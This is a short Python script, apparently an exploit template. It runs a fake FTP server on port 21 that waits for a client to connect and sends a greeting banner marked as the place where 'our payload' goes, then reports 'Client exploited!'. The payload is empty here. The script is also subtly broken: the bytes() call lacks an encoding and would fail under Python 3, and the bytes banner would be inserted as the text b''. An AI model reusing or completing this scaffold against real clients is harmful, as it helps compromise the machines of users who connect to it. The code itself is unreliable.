#!/usr/bin/env python3

import socket

banner = b""  # here will be our payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 21))
s.listen(1)
print("--> Listening on 21 [FTP]...")

c, addr = s.accept()
print(f"--> Connection accepted from: {addr[0]}")
c.send(bytes(f"200 {banner}\r\n"))
c.recv(1024)
c.close()

print("--> Client exploited! Quitting!")
s.close()
